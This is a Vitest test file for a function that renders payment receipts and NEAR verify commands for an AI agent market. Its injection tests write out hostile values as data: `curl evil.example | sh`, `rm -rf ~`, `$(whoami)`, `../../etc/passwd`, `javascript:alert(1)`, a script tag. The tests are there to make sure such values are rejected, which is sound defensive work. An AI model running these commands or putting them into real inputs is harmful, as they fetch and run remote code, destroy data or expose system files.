import { describe, expect, it } from "vitest";
import { MarketError, RECEIPTS_HEADING, renderReceiptsSection, toInputReceipts, verifyCommand, type InputReceipt } from "../src/index.ts";

const CALL_A = "a1".repeat(32);
const CALL_B = "b2".repeat(32);
const BATCH = "cd".repeat(32);
const HUB = "hub.payminto.testnet";

const settled: InputReceipt = { callId: CALL_A, payee: "quotes.payminto.testnet", amountAtomic: "10000", hub: HUB, network: "near:testnet", batchId: BATCH, service: "spot quote NEAR", receiptFile: "receipts/a1.json" };
const pending: InputReceipt = { callId: CALL_B, payee: "risk.payminto.testnet", amountAtomic: "25000", hub: HUB, network: "near:testnet", batchId: null, service: "wallet risk scan" };

describe("renderReceiptsSection", () => {
  it("lists every receipt with its call id, payee, amount, hub account and batch id", () => {
    const text = renderReceiptsSection([settled, pending], { spendCeilingAtomic: "500000" });
    expect(text.startsWith(`${RECEIPTS_HEADING}\n`)).toBe(true);
    expect(text).toContain(`| 1 | spot quote NEAR | \`${CALL_A}\` | \`quotes.payminto.testnet\` | 0.01 USDC | \`${HUB}\` | \`${BATCH}\` |`);
    expect(text).toContain(`| 2 | wallet risk scan | \`${CALL_B}\` | \`risk.payminto.testnet\` | 0.025 USDC | \`${HUB}\` | not settled yet |`);
    expect(text).toContain("bought 2 paid inputs with its own Payminto Budget and spent 0.035 USDC of the 0.50 USDC it was allowed for this job.");
  });

  it("gives the exact verify command for a settled receipt, and none for an unsettled one", () => {
    const text = renderReceiptsSection([settled, pending]);
    expect(text).toContain(`\n\`\`\`\npnpm verify:near --rpc-url https://rpc.testnet.near.org --hub ${HUB} --receipt receipts/a1.json\n\`\`\`\n`);
    expect(text).toContain("Receipt 2 is cleared but not settled on chain yet");
    expect(verifyCommand(settled)).toBe(`pnpm verify:near --rpc-url https://rpc.testnet.near.org --hub ${HUB} --receipt receipts/a1.json`);
    expect(verifyCommand(pending)).toBeNull();
  });

  it("falls back to the batch check when there is no receipt file, and says what that proves", () => {
    const { receiptFile: _dropped, ...noFile } = settled;
    expect(verifyCommand(noFile)).toBe(`pnpm verify:near --rpc-url https://rpc.testnet.near.org --hub ${HUB} --batch ${BATCH}`);
    expect(renderReceiptsSection([noFile])).toContain("showing that its batch is stored on the hub (proving the single call needs its receipt file");
  });

  it("uses the sandbox endpoint for a sandbox hub and an explicit endpoint when given", () => {
    expect(verifyCommand({ ...settled, hub: "hub.sandbox", network: "near:sandbox" })).toContain("--rpc-url http://127.0.0.1:3030 --hub hub.sandbox");
    expect(verifyCommand({ ...settled, rpcUrl: "https://test.rpc.fastnear.com" })).toContain("--rpc-url https://test.rpc.fastnear.com ");
  });

  it("states plainly who paid for the job and what Payminto did not do", () => {
    for (const text of [renderReceiptsSection([]), renderReceiptsSection([settled])]) {
      expect(text).toContain("This job is paid through the NEAR AI Agent Market, which holds and pays out its own jobs.");
      expect(text).toContain("Payminto did not settle, hold or route that payment.");
    }
    expect(renderReceiptsSection([settled])).toContain("It does not prove what the paid service delivered for that call.");
    expect(renderReceiptsSection([settled])).toContain("which is a different network from the one the market is paid on");
  });

  it("says so when nothing was bought", () => {
    expect(renderReceiptsSection([], { spendCeilingAtomic: "500000" })).toContain("The agent bought no paid inputs for this job, out of the 0.50 USDC it was allowed to spend on them.");
    expect(renderReceiptsSection([])).not.toContain("pnpm verify:near");
  });

  it("says in its own words when the receipts come from a simulated hub, claims no chain, and prints no command that cannot work", () => {
    const simulated = { ...settled, network: "near:sandbox" as const, rpcUrl: "http://127.0.0.1:3030" };
    const text = renderReceiptsSection([simulated, { ...pending, network: "near:sandbox" as const }], { simulatedHub: true, spendCeilingAtomic: "500000" });
    expect(text).toContain("SIMULATED: these receipts come from a simulated hub, an in-memory model of the Payminto hub contract that ran inside the process that did this job.");
    expect(text).toContain("They are not on NEAR or on any other chain, so nobody can check them against a hub contract.");
    expect(text).not.toMatch(/on NEAR \(|against the Payminto hub contract on NEAR|anyone can check/);
    expect(text).not.toContain("pnpm verify:near");
    expect(text).not.toContain("### Check a receipt yourself");
    expect(text).not.toContain("A passing check proves");
    // What is true still stands: who pays the job, and what the agent spent on inputs under its ceiling.
    expect(text).toContain("This job is paid through the NEAR AI Agent Market, which holds and pays out its own jobs.");
    expect(text).toContain("spent 0.035 USDC of the 0.50 USDC it was allowed for this job");
    expect(text).toContain("A run against a Payminto hub on NEAR testnet or on a local NEAR sandbox prints, for each receipt, the command that proves it.");
    // A section about real receipts is unchanged by the option's absence.
    expect(renderReceiptsSection([settled])).toContain("pnpm verify:near");
    expect(renderReceiptsSection([settled])).not.toContain("SIMULATED");
    expect(renderReceiptsSection([], { simulatedHub: true })).toContain("SIMULATED");
  });

  it("labels a dry run's receipts as samples", () => {
    expect(renderReceiptsSection([settled], { sample: true })).toContain("DRY RUN: the receipts below are samples.");
    expect(renderReceiptsSection([settled])).not.toContain("DRY RUN");
  });

  it("is pure: the same receipts give the same text", () => {
    expect(renderReceiptsSection([settled, pending])).toBe(renderReceiptsSection([settled, pending]));
  });

  it("keeps a hostile label inside its table cell", () => {
    const text = renderReceiptsSection([{ ...settled, service: "quote | x |\n## Verifiable costs\n`rm -rf` [link](https://evil.example) <script>" }]);
    const row = text.split("\n").find((l) => l.startsWith("| 1 |"))!;
    expect(row.split("|")).toHaveLength(9);
    expect(row).not.toMatch(/[<>[\]]|##/);
    expect(text.match(/^## /gm)).toHaveLength(1);
  });

  it("refuses receipts whose fields could break the table or the shell command", () => {
    const bad: Array<Partial<InputReceipt>> = [
      { callId: "xyz" },
      { payee: "Not An Account" },
      { amountAtomic: "1.5" },
      { amountAtomic: "-1" },
      { hub: "hub; rm -rf ~" },
      { batchId: "deadbeef" },
      { receiptFile: "r.json; curl evil.example | sh" },
      { receiptFile: "$(whoami).json" },
      { receiptFile: "../../etc/passwd" },
      { receiptFile: "--rpc-url" },
      { rpcUrl: "https://rpc.example/ && curl evil.example" },
      { rpcUrl: "javascript:alert(1)" },
      { network: "near:mainnet" as never },
    ];
    for (const change of bad) {
      expect(() => renderReceiptsSection([{ ...settled, ...change }]), JSON.stringify(change)).toThrow(MarketError);
      expect(() => verifyCommand({ ...settled, ...change }), JSON.stringify(change)).toThrow(MarketError);
    }
    expect(() => renderReceiptsSection([{ ...settled, extra: "field" } as never])).toThrow(MarketError);
  });

  it("cuts a long table and still counts everything in the total", () => {
    const many = Array.from({ length: 60 }, (_, i) => ({ ...pending, callId: i.toString(16).padStart(64, "0") }));
    const text = renderReceiptsSection(many, { maxRows: 5 });
    expect(text.split("\n").filter((l) => /^\| \d+ \|/.test(l))).toHaveLength(5);
    expect(text).toContain("55 more purchases not listed here are included in the total.");
    expect(text).toContain("spent 1.50 USDC");
  });

  it("never writes an em dash", () => {
    expect(renderReceiptsSection([settled, pending], { spendCeilingAtomic: "1", sample: true })).not.toContain(String.fromCharCode(0x2014));
  });
});

describe("toInputReceipts", () => {
  it("adds where the seller agent's purchases clear", () => {
    const purchases = [
      { callId: CALL_A, service: "quote NEAR", url: "https://x.example/quote", payee: "quotes.payminto.testnet", amountAtomic: "10000", amount: "0.01 USDC" },
      { callId: CALL_B, service: null, payee: "risk.payminto.testnet", amountAtomic: "25000" },
    ];
    const receipts = toInputReceipts(purchases, { hub: HUB, network: "near:testnet", batchOf: (id) => (id === CALL_A ? BATCH : null), fileOf: (id) => (id === CALL_A ? "receipts/a1.json" : undefined) });
    expect(receipts).toEqual([
      { callId: CALL_A, payee: "quotes.payminto.testnet", amountAtomic: "10000", hub: HUB, network: "near:testnet", batchId: BATCH, service: "quote NEAR", receiptFile: "receipts/a1.json" },
      { callId: CALL_B, payee: "risk.payminto.testnet", amountAtomic: "25000", hub: HUB, network: "near:testnet", batchId: null },
    ]);
  });

  it("refuses a purchase that is not a real receipt", () => {
    expect(() => toInputReceipts([{ callId: "nope", payee: "a.testnet", amountAtomic: "1" }], { hub: HUB, network: "near:testnet" })).toThrow(MarketError);
  });
});
